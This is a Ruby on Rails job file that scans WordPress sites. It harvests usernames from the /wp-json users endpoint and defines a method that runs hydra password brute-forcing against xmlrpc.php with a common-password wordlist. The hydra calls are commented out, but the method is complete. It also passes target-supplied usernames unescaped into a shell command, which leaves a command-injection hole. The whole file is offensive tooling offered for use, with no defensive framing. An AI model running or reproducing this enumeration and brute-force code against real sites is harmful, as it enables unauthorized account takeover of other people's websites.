# encoding: utf-8
require 'uri'
require 'cgi'
require 'json'
require 'httparty'
require 'fileutils'

class RunGetWpUsernameJob < ApplicationJob
  queue_as :default

  def perform(server)
    site_url = "#{server.protocal}://#{server.name}"
    Rails.logger.info "== checking: #{site_url}"

    # 1. 从/wp-json/wp/v2/users/获取用户名
    usernames = enum_from_json(site_url)
    
    if usernames.present?
      Rails.logger.info "[+] Found #{usernames.length} usernames in /wp-json"
      usernames.each do |username|
        Rails.logger.info "[+] Found username: #{username}"
        # 2. 使用hydra进行爆破
        # hydra_bruteforce(site_url, username, "/opt/app/SecLists/Passwords/Common-Credentials/Pwdb_top-1000.txt") 
        # hydra_bruteforce(site_url, username, "/opt/app/SecLists/Passwords/Common-Credentials/Pwdb_top-1000.txt")
      end
      # 3. 更新服务器信息
      server.update(wpscan_usernames: usernames.join(','))      
    else
      Rails.logger.info "[-] Unable to find user from JSON"
    end
  end

  private

  def enum_from_json(site_url)
    target = "#{site_url}/wp-json/wp/v2/users/"
    usernames = []
    
    begin
      response = HTTParty.get(target,
        headers: { 
          'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept' => 'application/json'
        },
        timeout: 10,
        follow_redirects: true,
        verify: false  # 忽略SSL证书验证，处理证书过期问题
      )
      
      Rails.logger.info "Response status: #{response.code}"
      
      if response.code == 200 && response.body.present?
        users = JSON.parse(response.body)
        if users.is_a?(Array)
          usernames = users.map { |user| user['slug'] }.compact
        end
      end
    rescue Exception => e
      Rails.logger.warn "Error fetching JSON: #{e.message}"
      Rails.logger.warn e.backtrace.join("\n")
    end
    
    usernames
  end

  # 使用hydra进行爆破，通过XML-RPC方式验证
  def hydra_bruteforce(site_url, username, password_file)
    # 构造hydra命令，使用XML-RPC方式进行验证
    xmlrpc_url = "#{site_url}/xmlrpc.php"
    output_file = File.join("log", "#{URI(site_url).host}_#{username}_hydra_result.txt")
    
    # 使用http-post-form模块针对XML-RPC进行爆破
    # 构造XML-RPC请求体，其中^USER^和^PASS^会被hydra替换
    command = "hydra -l #{username} -P #{password_file} -o #{output_file} -f #{URI(site_url).host} http-post-form \"/xmlrpc.php:<?xml version='1.0'?><methodCall><methodName>wp.getUsers</methodName><params><param><value><string>1</string></value></param><param><value><string>^USER^</string></value></param><param><value><string>^PASS^</string></value></param></params></methodCall>:faultCode\""
    
    Rails.logger.info "== Running hydra command: #{command}"
    
    begin
      result = `#{command}`
      Rails.logger.info "== Hydra result: #{result}"
    rescue Exception => e
      Rails.logger.warn "Error running hydra: #{e.message}"
    end
  end
end